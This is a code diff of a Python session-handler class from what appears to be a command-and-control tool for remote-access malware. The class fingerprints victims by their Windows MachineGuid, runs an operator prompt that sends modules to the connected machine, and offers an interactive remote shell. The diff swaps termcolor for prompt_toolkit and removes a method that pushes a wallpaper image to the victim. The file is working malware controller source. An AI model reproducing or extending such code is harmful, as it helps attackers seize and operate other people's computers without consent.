@@ -1,8 +1,8 @@
 import sys, os, threading, time, subprocess
 from hashlib import md5
-from termcolor import colored
 from lib.helper import *
 from lib.debug import Debug
+from prompt_toolkit.shortcuts import prompt
 
 class Dmos:
     def __init__(self, basic, sysinfo, global_addr, conn, c2):
@@ -17,7 +17,7 @@ class Dmos:
         self.MGUID          = sysinfo["MGUID"]
         # unique hash generated from MachineGuid in Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
         self.md5_hash       = md5(self.MGUID.encode()).hexdigest()
-        self.born           = colored(ctime(), 'yellow')
+        self.born           = ctime()
         self.conn           = conn
         self.interactive    = False
         self.c2             = c2
@@ -27,7 +27,7 @@ class Dmos:
         conn = self.conn
         modules_multi = self.c2.modules_multi
         while 1:
-            command = input(colored(f"[{self.USERNAME}@{self.GLOBAL}]>> ", 'cyan', attrs=['bold']))
+            command = prompt(f"[{self.USERNAME}@{self.GLOBAL}]>> ", style=prompt_style)
             cmd = command.split(' ')[0]
             args = command[len(cmd)+1:]
 
@@ -35,7 +35,7 @@ class Dmos:
                 modules_multi[cmd]._exec(self, args)
             elif command == "free":
                 self.free_dmos()
-                terminate(conn, self.c2.multi_handler.dmoss, self, "gracefully")
+                terminate(self.c2.multi_handler.dmoss, self, signal="gracefully")
                 break
             elif command == "shell":
                 self.interactive_shell()
@@ -101,16 +101,3 @@ class Dmos:
             image_data += d
         f.write(image_data)
         f.close()
-    def background_changer(self, image_path):
-         self.conn.send("bgchange".encode())
-         self.conn.send("test_image.png".encode())
-         progress = tqdm.tqdm(range(os.path.getsize(image_path)), f"Sending {image_path}", unit="B", unit_scale=True, unit_divisor=1024)
-         with open(image_path, 'rb') as f:
-             for _ in progress:
-                 data = f.read(1024)
-                 if not data:
-                     break
-                 self.conn.sendall(data)
-                 progress.update(len(data))
-         f.close()
-         self.conn.send("FIN".encode())
